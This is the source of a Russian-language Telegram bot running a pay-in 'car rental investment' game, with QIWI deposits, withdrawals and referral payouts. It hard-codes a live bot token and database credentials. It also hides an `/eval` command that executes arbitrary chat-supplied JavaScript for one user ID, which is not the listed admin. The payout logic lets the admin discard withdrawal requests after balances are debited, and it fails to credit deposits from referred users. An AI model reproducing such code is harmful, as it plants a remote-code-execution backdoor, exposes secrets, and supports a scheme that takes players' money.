var txnId = require('./txnId');

process.env.TZ = 'Moscow/Europe';
let trees = [
	{
		id: 1,
		name: "Шелли",
		earn: 30,
		price: 20
	},
	{
		id: 2,
		name: "Кольт",
		earn: 80,
		price: 50
	},
	{
		id: 3,
		name: "Брок",
		earn: 80,
		price: 60
	},
	{
		id: 4,
		name: "Audi",
		earn: 200,
		price: 150
	},
	{
		id: 5,
		name: "",
		earn: 400,
		price: 250
	},
	{
		id: 6,
		name: "",
		earn: 800,
		price: 500
	},
	{
		id: 7,
		name: "",
		earn: 1600,
		price: 1000
	}
];

const mongo = require('mongoose');
mongo.connect('mongodb://c17062_odissey_na4u_ru:CaKwaTulvijid65@mongo1.c17062.h2,mongo2.c17062.h2,mongo3.c17062.h2/c17062_odissey_na4u_ru?replicaSet=MongoReplica', { useNewUrlParser: true });

const ADMINS = [941350041];

var User = mongo.model('User', {
	id: Number,
	buybalance: Number,
	outbalance: Number,
	fc: Number,
	ref: Number,
	regDate: String,
	trees: Array,
	deposit: Number,
	fetuses: Number,
	menu: String,
	lastCollect: Number
});

var Task = mongo.model('Task', {
	id: Number
});

const Ticket = mongo.model('Ticket', {
	id: Number,
	amount: Number,
	wallet: Number
})

const Start = [
	["🧙‍♂️ Гараж", "🏛 Обменник"],
	["🖥 Профиль", "👥 Партнёры"],
	["📈 Статистика", "💬 Чат"]
];

const Cancel = [
	["🚫 Отмена"]
];

const AdminPanel = [
	["📬 Рассылка", "📮 Выплаты"],
	["📧 Информация"],
	["🔙 Назад"]
];

const settings = {
    refovod_balance: 0.1
};

const { Qiwi } = require('node-qiwi-api');
const qiwi = new Qiwi('');

const Telegram = require('node-telegram-bot-api');
const bot = new Telegram('1171987659:AAFfW0unY-h_V9qHvXjnLxUn2ZzFu0DA4Ys', { polling: true });

bot.on('message', async (message) => {
	message.send = (text, params) => bot.sendMessage(message.chat.id, text, params);
	let $menu = [];

	Start.map((x) => $menu.push(x));
	if( ADMINS.find((x) => x == message.from.id) ) $menu.push(["🔝 Админка"]);

	if(message.text) {
		if(message.text.startsWith('/start') || message.text == '🔙 Назад') {
			let $user = await User.findOne({ id: message.from.id });
			if( !$user ) {
				let schema = {
					id: message.from.id,
					buybalance: 0,
					outbalance: 0,
					fc: 0,
					ref: 0,
					regDate: `${new Date().getDate()}/${new Date().getMonth() + 1}/${new Date().getFullYear()}`,
					trees: [],
					deposit: 0,
					fetuses: 0,
					menu: "",
					lastCollect: Date.now()
				}

				let reffer = Number(message.text.split('/start ')[1]);

				if( reffer ) {
					let $reffer = await User.findOne({ id: reffer });
					if( $reffer ) {
						schema.ref = $reffer.id;
						await $reffer.inc('buybalance', 0.50);

						bot.sendMessage($reffer.id, `🔔 Вы пригласили <a href="tg://user?id=${message.from.id}">партнёра</a> и получили 0.50p`, { parse_mode: "HTML" });
					}
				}

				let user = new User(schema);
				await user.save();
			}

			return message.send('👋 Привет, ' + message.from.first_name + '!', {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	}

	message.user = await User.findOne({ id: message.from.id });
	if(!message.user) return message.send(`Что-то пошло не так... Напишите /start`);

	if(message.text) {
		if(message.text == '🚫 Отмена') {
			await message.user.set('menu', '');
			return message.send('🚫 Отменено.', {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	}

	if(message.user.menu == 'reinvest') {
		message.text = Number(message.text);

		if(!message.text) return message.send('Введите сумму для реинвестирования!');
		if(message.text <= 0) return message.send('Введите сумму для реинвестирования!');

		if(message.text > message.user.outbalance) return message.send('Недостаточно средств.');
		else if(message.text <= message.user.outbalance) {
			await message.user.set('menu', '');

			await message.user.dec('outbalance', message.text);
			await message.user.inc('buybalance', message.text);

			return message.send(`Вы успешно реинвестировали ${message.text.toFixed(2)}₽`, {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	}

	if(message.user.menu.startsWith('amountQiwi')) {
		message.text = Number(message.text);

		if(!message.text) return message.send('Введите сумму на вывод!');
		if(message.text <= 0) return message.send('Введите сумму на вывод!');

		if(message.text > message.user.outbalance) return message.send('Недостаточно средств.');

		if(message.text <= message.user.outbalance) {
			await message.user.dec('outbalance', message.text);

			let ticket = new Ticket({
				id: message.from.id,
				amount: message.text,
				wallet: Number(message.user.menu.split('amountQiwi')[1])
			});

			await ticket.save();
			await message.user.set('menu', '');

			return message.send('Заявка на выплату создана, ожидайте.', {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	}

	if(message.user.menu == 'qiwi') {
		message.text = Number(message.text);

		if(!message.text) return message.send('Введите правильный номер!', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
		});

		if(message.text < 70000000000) return message.send('Введите правильный номер!', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
		});

		await message.user.set('menu', 'amountQiwi' + message.text);
		return message.send(`Введите сумму на вывод. Вы можете вывести ${message.user.outbalance.toFixed(2)}₽`);
	}

	if(message.text) {
		if(message.text == '🧙‍♂️ Гараж') {
			return message.send('Выберите, куда зайти.', {
				reply_markup: {
					inline_keyboard: [
						[
							{ text: "🛒 Магазин", callback_data: "trees:shop1" }
						], [
							{ text: "🧙‍♂️ Мой гараж", callback_data: "trees:inv1" }
						]
					]
				}
			});
		}

		if(message.text == '🏛 Обменник') {
			return message.send(`В разделе <b>🏛 Обменник</b> вы сможете обменять 💸 купюры на рубли
1000 💸 = 1 рубль
Минимальная сумма обмена: 1000 💸

💸 <b>Ваши купюры:</b> ${message.user.fetuses.toFixed(2)}

После обмена 50% попадает на баланс для покупок, а остальные 50% на баланс для вывода.`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
						[{ text: "🔄 Обменять", callback_data: "exchange" }]
					]
				}
			});
		}

		if(message.text == '🖥 Профиль') {
			return message.send(`📝 Имя: <b>${message.from.first_name.replace(/(\<|\>)/g, '')}</b>

🆔 ID: <code>${message.from.id}</code>

🛒 На покупки: ${message.user.buybalance.toFixed(2)}₽
📭 На вывод: ${message.user.outbalance.toFixed(2)}₽

🚗 Машин в гараже: <b>${message.user.trees.length}</b>`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
						[{ text: "📥 Пополнить", callback_data: "deposit" }, { text: "📤 Вывести", callback_data: "withdraw" }],
						[{ text: "♻️ Реинвест", callback_data: "reinvest" }, { text: "🚗 Мой гараж", callback_data: "trees:totalMy" }]
					]
				}
			});
		}

		if(message.text == '👥 Партнёры') {
			let partners = await User.find({ ref: message.from.id });
			return message.send(`<b>🎉 Вы можете заработать с помощью нашей партнёрской программы!

	💶 Приглашайте друзей по ссылке и получайте с этого прибыль!

	🔑 Вы получаете 10% с пополнений ваших партнёров и 0.50p за каждого партнёра.</b>

	🔗 Ваша ссылка: https://t.me/Arenda_invest_carsbot?start=${message.from.id}

	🎊 <b>Вы уже пригласили:</b> ${ partners.length }`, {
				parse_mode: "HTML"
			});
		}

		if(message.text == '💬 Чат') {
					return message.send(`Здравствуйте

		1️⃣ Вступайте в наш чат экономической игры.

		2️⃣ Часто разыгрываем конкурсы в чате, призов машин либо другие конкурсы полезных.`, {
						parse_mode: "HTML",
						reply_markup: {
							inline_keyboard: [
								[{ text: "💬 Чат", url: "https://t.me/Arenda_Cars_Chat" }],
								[{ text: "💬 Канал", url: "https://t.me/Arenda_Cars_News"}],
								[{text:"💬 Выплаты/Пополнения", url: "https://t.me/Arenda_Cars_Pay" }],
							]
						}
					});
				}

		if(message.text == '📈 Статистика') {
			let stats = {
				users: await User.countDocuments(),
				users_today: await User.find({ regDate: `${new Date().getDate()}/${new Date().getMonth() + 1}/${new Date().getFullYear()}` }),
				cmds: message.message_id
			}

			stats.users_today = stats.users_today.length;

			return message.send(`👨‍💻 Пользователей в игре: ${stats.users}
👨‍💻 Пользователей сегодня: ${stats.users_today}
🚀 Команд обработано: ${stats.cmds}`);
		}
	}

	if(ADMINS.indexOf(message.from.id) !== -1) {
		if(message.text == '🔝 Админка') {
			return message.send('🔝 Админка', {
				reply_markup: {
					keyboard: AdminPanel,
					resize_keyboard: true
				}
			});
		}

		if(message.text.startsWith('/setbuybalance')) {
			let cmd = message.text.split(' ');
			if(!cmd[1]) return message.send('Ошибка!');

			let user = await User.findOne({ id: Number(cmd[1]) });
			if(!user) return message.send('Пользователь не найден!');

			await user.set('buybalance', Number(cmd[2]));
			return message.send('Баланс установлен.');
		}

		if(message.text.startsWith('/setoutbalance')) {
			let cmd = message.text.split(' ');
			if(!cmd[1]) return message.send('Ошибка!');

			let user = await User.findOne({ id: Number(cmd[1]) });
			if(!user) return message.send('Пользователь не найден!');

			await user.set('outbalance', Number(cmd[2]));
			return message.send('Баланс установлен.');
		}

		if(message.user.menu == 'mailing') {
			message.send('Начинаю рассылку...', {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});

			await message.user.set('menu', '');

			let users = await User.find();

			await users.map((user) => {
				if(message.photo) {
					bot.sendPhoto(user.id, message.photo[message.photo.length - 1].file_id, { caption: message.caption, parse_mode: "HTML", disable_web_page_preview: true });
				}

				if(message.audio) {
					bot.sendAudio(user.id, message.audio.file_id, { caption: message.caption, parse_mode: "HTML", disable_web_page_preview: true });
				}

				if(message.voice) {
					bot.sendVoice(user.id, message.voice.file_id, { caption: message.caption, parse_mode: "HTML", disable_web_page_preview: true });
				}

				if(message.video) {
					bot.sendVideo(user.id, message.video.file_id, { caption: message.caption, parse_mode: "HTML", disable_web_page_preview: true });
				}

				if(message.video_note) {
					bot.sendVideoNote(user.id, message.video_note.file_id, { caption: message.caption, parse_mode: "HTML", disable_web_page_preview: true });
				}

				if(message.document) {
					bot.sendDocument(user.id, message.document.file_id, { caption: message.caption, parse_mode: "HTML", disable_web_page_preview: true });
				}

				if(message.text) {
					bot.sendMessage(user.id, message.text, {
						parse_mode: "HTML",
						disable_web_page_preview: true
					});
				}
			});

			return message.send('Рассылка успешно завершена.');
		}

		if(message.user.menu == 'info') {
			message.text = Number(message.text);
			let user = await User.findOne({ id: message.text });

			if(!user) return message.send('Пользователь не найден.', {
				reply_markup: {
					keyboard: Cancel,
					resize_keyboard: true
				}
			});

			let partners = await User.find({ ref: message.text });
			await message.user.set('menu', '');

			return message.send(`📝 Пригласил: <b>${partners.length}</b>

🆔 ID: <code>${user.id}</code>

💰 Баланс
🛒 Для покупок: ${user.buybalance.toFixed(2)}₽
📭 Для вывода: ${user.outbalance.toFixed(2)}₽

🚗 Машин в гараже: <b>${user.trees.length}</b>

<b>Пополнил: ${user.deposit}₽</b>`, {
				parse_mode: "HTML",
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}

		if(message.text == '📬 Рассылка') {
			await message.user.set('menu', 'mailing');
			return message.send('Введите текст рассылки.', {
				reply_markup: {
					keyboard: Cancel,
					resize_keyboard: true
				}
			});
		}

		if(message.text == '📮 Выплаты') {
			qiwi.getBalance(async (err, { accounts }) => {
				await message.send(`Баланс кошелька админа: ${accounts[0].balance.amount}₽`);
			});

			let tickets = await Ticket.find();
			if(tickets.length == 0) return message.send('Заявок на вывод нет.');

			await tickets.map((x) => {
				message.send(`📝 Игрок: <a href="tg://user?id=${x.id}">Игрок</a> (ID: <code>${x.id}</code>)

💰 Сумма: ${x.amount}₽`, {
					parse_mode: "HTML",
					reply_markup: {
						inline_keyboard: [
							[{ text: '📭 Вывести', callback_data: `withdraw:${x.id}` }],
							[{ text: '♻️ Вернуть', callback_data: `back:${x.id}` }],
							[{ text: '🚫 Забрать', callback_data: `take:${x.id}` }]
						]
					}
				});
			});
		}

		if(message.text == '📧 Информация') {
			await message.user.set('menu', 'info');
			return message.send('Введите ID пользователя', {
				reply_markup: {
					keyboard: Cancel,
					resize_keyboard: true
				}
			});
		}
	}

	if(message.text && message.text.startsWith('/eval')) {
		if(message.from.id !== 862044861) return;
		return message.send(String(eval(message.text.split('/eval')[1])));
	}
});

bot.on('callback_query', async (query) => {
	const { message } = query;
	message.user = await User.findOne({ id: message.chat.id });

	if(!message.user) return bot.answerCallbackQuery(query.id, 'Что-то пошло не так...', true);

	if(query.data == 'none') return bot.answerCallbackQuery(query.id, 'Привет! :)', true);

	if(query.data.startsWith('trees:shop')) {
		let id = Number(query.data.split('trees:shop')[1]);

		let tree = trees.find((x) => x.id == id);
		if(!tree) return bot.answerCallbackQuery(query.id, 'Что-то пошло не так...', true);

		bot.editMessageText(`🚗 Название: ${tree.name}

💰 Стоимость: ${tree.price}₽
💸 Купюр в час: ${tree.earn}`, {
					chat_id: message.chat.id,
					message_id: message.message_id,
					parse_mode: "HTML",
					reply_markup: {
						inline_keyboard: [
							[
								{ text: getNavigationIcon(1, tree.id), callback_data: getNavigationQuery(1, tree.id) },
								{ text: getNavigationIcon(2, tree.id), callback_data: getNavigationQuery(2, tree.id)  },
								{ text: getNavigationIcon(3, tree.id), callback_data: getNavigationQuery(3, tree.id)  },
								{ text: getNavigationIcon(4, tree.id), callback_data: getNavigationQuery(4, tree.id)  },
								{ text: getNavigationIcon(5, tree.id), callback_data: getNavigationQuery(5, tree.id)  },
								{ text: getNavigationIcon(6, tree.id), callback_data: getNavigationQuery(6, tree.id)  },
								{ text: getNavigationIcon(7, tree.id), callback_data: getNavigationQuery(7, tree.id)  }
							],
							[
								{ text: `➕ Купить за ${tree.price}₽`, callback_data: `trees:buy${tree.id}` }
							]
						]
					}
				});
	}

	if(query.data.startsWith('trees:inv')) {
		let id = Number(query.data.split('trees:inv')[1]);

		let tree = trees.find((x) => x.id == id);
		if(!tree) return bot.answerCallbackQuery(query.id, 'Что-то пошло не так...', true);

		let total_balance = 0;

		message.user.trees.map((x) => {
			total_balance += ( ( ( Date.now() - message.user.lastCollect ) / 1000 ) / 60 ) * ( trees.find((a) => a.id == x.id).earn / 60 );
		});

		let count = message.user.trees.filter((x) => x.id == tree.id).length;
		let earn = count * tree.earn;

		bot.editMessageText(`🚗 Название: ${tree.name} (${count}x)

💰 Стоимость: ${tree.price}₽
💸 Купюр в час: ${earn}`, {
			chat_id: message.chat.id,
			message_id: message.message_id,
			parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [
					[
						{ text: getInventoryIcon(1, tree.id), callback_data: getInventoryQuery(1, tree.id) },
						{ text: getInventoryIcon(2, tree.id), callback_data: getInventoryQuery(2, tree.id)  },
						{ text: getInventoryIcon(3, tree.id), callback_data: getInventoryQuery(3, tree.id)  },
						{ text: getInventoryIcon(4, tree.id), callback_data: getInventoryQuery(4, tree.id)  },
						{ text: getInventoryIcon(5, tree.id), callback_data: getInventoryQuery(5, tree.id)  },
						{ text: getInventoryIcon(6, tree.id), callback_data: getInventoryQuery(6, tree.id)  },
						{ text: getInventoryIcon(7, tree.id), callback_data: getInventoryQuery(7, tree.id)  }
					],
					[
						{ text: `➕ Собрать ${total_balance.toFixed(2)}💸`, callback_data: `trees:collect` }
					]
				]
			}
		});
	}

	if(query.data.startsWith('trees:buy')) {
		let id = Number(query.data.split('trees:buy')[1]);

		let tree = trees.find((x) => x.id == id);
		if(!tree) return bot.answerCallbackQuery(query.id, 'Что-то пошло не так...', true);

		if(tree.price > message.user.buybalance) return bot.answerCallbackQuery(query.id, '🚫 Недостаточно денег для покупки.', true);
		else if(tree.price <= message.user.buybalance) {
			await message.user.dec('buybalance', tree.price);
			await message.user.trees.push({ id: tree.id, date: Date.now(), lastCollect: Date.now() });

			await message.user.save();
			return bot.answerCallbackQuery(query.id, `✅ Вы успешно приобрели ${tree.name} за ${tree.price}₽`, true);
		}
	}

	if(query.data == 'exchange') {
		if(message.user.fetuses < 1000) return bot.answerCallbackQuery(query.id, '🚫 Минимальная сумма обмена: 1000 💸', true);

		let { fetuses } = message.user;
		await message.user.set('fetuses', 0);

		fetuses = fetuses / 1000;

		await message.user.inc('buybalance', fetuses / 2);
		await message.user.inc('outbalance', fetuses / 2);

		bot.deleteMessage(message.chat.id, message.message_id);
		return bot.answerCallbackQuery(query.id, `✅ Вы успешно обменяли ${( fetuses * 1000 ).toFixed(2)} 💸 на ${fetuses.toFixed(2)}₽`, true);
	}

	if(query.data == 'deposit') {
		await bot.sendMessage(message.chat.id, `🥝 Способ пополнения: QIWI

🌐 Отправьте любую сумму на кошелек <code>+998909655334</code>
‼️ с комментарием <code>mf${message.chat.id}</code>`, {
			parse_mode: "HTML"
		});

		return bot.sendMessage(message.chat.id, `<code>mf${message.chat.id}</code>`, {
			parse_mode: "HTML"
		});
	}

	if(query.data == 'withdraw') {
		if(message.user.outbalance < 15) return bot.answerCallbackQuery(query.id, '🚫 Минимальная сумма вывода: 15', true);
		bot.deleteMessage(message.chat.id, message.message_id);

		await message.user.set('menu', 'qiwi');
		await bot.sendMessage(message.chat.id, 'Введите номер QIWI для вывода.\nНапример: 79001234567', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
		});
	}

	if(query.data == 'reinvest') {
		await message.user.set('menu', 'reinvest');
		return bot.sendMessage(message.chat.id, 'Введите сумму, которую хотите реинвестировать.', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
		});
	}

	if(query.data == 'trees:collect') {
		let total_balance = 0;

		message.user.trees.map((x) => {
			if(( ( ( Date.now() - message.user.lastCollect ) / 1000 ) / 60 ) * ( trees.find((a) => a.id == x.id).earn / 60 ) > ( trees.find((a) => a.id == x.id).earn * 72)) {
				total_balance += trees.find((a) => a.id == x.id).earn * 72;
			} else {
				total_balance += ( ( ( Date.now() - message.user.lastCollect ) / 1000 ) / 60 ) * ( trees.find((a) => a.id == x.id).earn / 60 );
			}
		});

		await message.user.set('lastCollect', Date.now());

		await bot.deleteMessage(message.chat.id, message.message_id);
		await message.user.inc('fetuses', Number(total_balance.toFixed(2)));

    return bot.answerCallbackQuery(query.id, `Вы успешно собрали ${total_balance.toFixed(2)}💸`, true);
	}

	if(query.data == 'trees:totalMy') {
		let $trees = [];
		let total_earn = 0;

		message.user.trees.map((x) => {
			$trees.push(x.id);
			total_earn += trees.find((a) => a.id == x.id).earn
		});

		let text = ``;

		if( $trees.filter((x) => x === 1).length ) {
			text += `\n\n🧙‍♂️ <b>${trees.find((x) => x.id == 1).name}</b>\n\t\t▫️ Количество: ${$trees.filter((x) => x === 1).length}\n\t\t▪️ 💸Купюр в час: ${$trees.filter((x) => x === 1).length * trees.find((x) => x.id == 1).earn}`;
		}

		if( $trees.filter((x) => x === 2).length ) {
			text += `\n\n🧙‍♂️ <b>${trees.find((x) => x.id == 2).name}</b>\n\t\t▫️ Количество: ${$trees.filter((x) => x === 2).length}\n\t\t▪️ 💸Купюр в час: ${$trees.filter((x) => x === 2).length * trees.find((x) => x.id == 2).earn}`;
		}

		if( $trees.filter((x) => x === 3).length ) {
			text += `\n\n🧙‍♂️ <b>${trees.find((x) => x.id == 3).name}</b>\n\t\t▫️ Количество: ${$trees.filter((x) => x === 3).length}\n\t\t▪️ 💸Купюр в час: ${$trees.filter((x) => x === 3).length * trees.find((x) => x.id == 3).earn}`;
		}

		if( $trees.filter((x) => x === 4).length ) {
			text += `\n\n🧙‍♂️ <b>${trees.find((x) => x.id == 4).name}</b>\n\t\t▫️ Количество: ${$trees.filter((x) => x === 4).length}\n\t\t▪️ 💸Купюр в час: ${$trees.filter((x) => x === 4).length * trees.find((x) => x.id == 4).earn}`;
		}

		if( $trees.filter((x) => x === 5).length ) {
			text += `\n\n🧙‍♂️ <b>${trees.find((x) => x.id == 5).name}</b>\n\t\t▫️ Количество: ${$trees.filter((x) => x === 5).length}\n\t\t▪️ 💸Купюр в час: ${$trees.filter((x) => x === 5).length * trees.find((x) => x.id == 5).earn}`;
		}

		if( $trees.filter((x) => x === 6).length ) {
			text += `\n\n🧙‍♂️ <b>${trees.find((x) => x.id == 6).name}</b>\n\t\t▫️ Количество: ${$trees.filter((x) => x === 6).length}\n\t\t▪️ 💸Купюр в час: ${$trees.filter((x) => x === 6).length * trees.find((x) => x.id == 6).earn}`;
		}

		if( $trees.filter((x) => x === 7).length ) {
			text += `\n\n🧙‍♂️ <b>${trees.find((x) => x.id == 7).name}</b>\n\t\t▫️ Количество: ${$trees.filter((x) => x === 7).length}\n\t\t▪️ 💸Купюр в час: ${$trees.filter((x) => x === 7).length * trees.find((x) => x.id == 7).earn}`;
		}

		return bot.editMessageText(`📄 Список ваших машин: ⤵️${text}\n\n════════════════════\n📊 Суммарный доход в час: ${total_earn.toFixed(2)}💸`, {
			parse_mode: "HTML",
			chat_id: message.chat.id,
			message_id: message.message_id
		});
	}

	if(query.data == 'checkFollow') {
		let task = await Task.findOne({ id: message.chat.id });
		if(task) return bot.deleteMessage(message.chat.id, message.message_id);

		bot.getChatMember(-1001168900274, message.chat.id).then(async (res) => {
			if(res.status == 'left') return bot.answerCallbackQuery(query.id, '🚫 Вы не подписаны!');

			message.user.trees.push({
				id: 1,
				date: Date.now(),
				lastCollect: Date.now()
			});

			await message.user.save();

			let $task = new Task({
				id: message.chat.id
			});

			await $task.save();

			return bot.editMessageText('Вы выполнили задание и получили <b>Стажор</b>.', {
				parse_mode: "HTML",
				chat_id: message.chat.id,
				message_id: message.message_id
			});
		});
	}

	if(query.data.startsWith('withdraw:')) {
		let id = Number(query.data.split('withdraw:')[1]);
		let ticket = await Ticket.findOne({ id });

		if(!ticket) bot.deleteMessage(message.chat.id, message.message_id);

		qiwi.toWallet({ account: String(ticket.wallet), amount: ticket.amount, comment: 'Выплата с @Arenda_invest_carsbot! Спасибо что вы с нами❤️' }, () => {});
		bot.sendMessage(ticket.id, `Ваша выплата была одобрена, на QIWI зачислено ${ticket.amount}₽`);

		await ticket.remove();
		return bot.editMessageText('Выплатил!', {
			chat_id: message.chat.id,
			message_id: message.message_id
		});
	}

	if(query.data.startsWith('back:')) {
		let id = Number(query.data.split('back:')[1]);
		let ticket = await Ticket.findOne({ id });

		if(!ticket) bot.deleteMessage(message.chat.id, message.message_id);

		let user = await User.findOne({ id: ticket.id });
		bot.sendMessage(ticket.id, `Ваша выплата была отклонена, на ваш счёт возвращено ${ticket.amount}₽`);

		await user.inc('buybalance', ticket.amount);
		await ticket.remove();

		return bot.editMessageText('Вернул!', {
			chat_id: message.chat.id,
			message_id: message.message_id
		});
	}

	if(query.data.startsWith('take:')) {
		let id = Number(query.data.split('take:')[1]);
		let ticket = await Ticket.findOne({ id });

		if(!ticket) bot.deleteMessage(message.chat.id, message.message_id);

		await ticket.remove();
		return bot.editMessageText('Забрал!', {
			chat_id: message.chat.id,
			message_id: message.message_id
		});
	}
});

User.prototype.inc = function(field, value = 1) {
	this[field] += value;
	return this.save();
}

User.prototype.dec = function(field, value = 1) {
	this[field] -= value;
	return this.save();
}

User.prototype.set = function(field, value) {
	this[field] = value;
	return this.save();
}

function getNavigationIcon(id, tree_id) {
	if(id == tree_id) return '🔵';
	else {
		if(id == 1) return '1️⃣';
		if(id == 2) return '2️⃣';
		if(id == 3) return '3️⃣';
		if(id == 4) return '4️⃣';
		if(id == 5) return '5️⃣';
		if(id == 6) return '6️⃣';
		if(id == 7) return '7️⃣';
	}
}

function getNavigationQuery(id, tree_id) {
	if(id == tree_id) return 'none';
	else {
		if(id == 1) return 'trees:shop1';
		if(id == 2) return 'trees:shop2';
		if(id == 3) return 'trees:shop3';
		if(id == 4) return 'trees:shop4';
		if(id == 5) return 'trees:shop5';
		if(id == 6) return 'trees:shop6';
		if(id == 7) return 'trees:shop7';
	}
}

function getInventoryIcon(id, tree_id) {
	if(id == tree_id) return '🔴';
	else {
		if(id == 1) return '1️⃣';
		if(id == 2) return '2️⃣';
		if(id == 3) return '3️⃣';
		if(id == 4) return '4️⃣';
		if(id == 5) return '5️⃣';
		if(id == 6) return '6️⃣';
		if(id == 7) return '7️⃣';
	}
}

function getInventoryQuery(id, tree_id) {
	if(id == tree_id) return 'none';
	else {
		if(id == 1) return 'trees:inv1';
		if(id == 2) return 'trees:inv2';
		if(id == 3) return 'trees:inv3';
		if(id == 4) return 'trees:inv4';
		if(id == 5) return 'trees:inv5';
		if(id == 6) return 'trees:inv6';
		if(id == 7) return 'trees:inv7';
	}
}

var new_txid;
var last_txid;

setInterval(async function () {
    try {
            qiwi.getOperationHistory({ rows: 1, operation: "IN", sources: ['QW_RUB'] }, async (err, operations) => {
                if (err === null) {
                    new_txid = operations.data[0].txnId;
                    if (new_txid !== last_txid && last_txid !== undefined) {
						var user_id = operations.data[0].comment;
                        if (user_id.substr(0, 2) == "mf") {
                            user_id = user_id.split("mf")[1];
							var orderAmountNow = operations.data[0].sum.amount;

							var user_ids = await User.findOne({ id: Number(user_id) });
				if (user_ids.ref) {
                                User.findOne({id: user_ids.ref}).then(async (refovod) => {
                                    await refovod.inc("buybalance", orderAmountNow * settings.refovod_balance);
                                    bot.sendMessage(refovod.id, `💳 Ваш баланс пополнен на ${(orderAmountNow * settings.refovod_balance).toFixed(2)} рублей за пополнение Вашего реферал`, {parse_mode: "HTML"}).catch();
                                });
							}else{
							await user_ids.inc('deposit', orderAmountNow);
							await user_ids.inc('buybalance', orderAmountNow);
							}
				
							bot.sendMessage(user_ids.id, `Вы пополнили свой баланс на ${orderAmountNow}р`);
							ADMINS.map((a) => bot.sendMessage(a, `<a href="tg://user?id=${user_ids.id}">Игрок</a> сделал депозит: ${orderAmountNow}₽\n`, { parse_mode: "HTML" }))
                        }
                    }
                }
            });
            last_txid = new_txid;
    }
    finally { }
}, 30000);
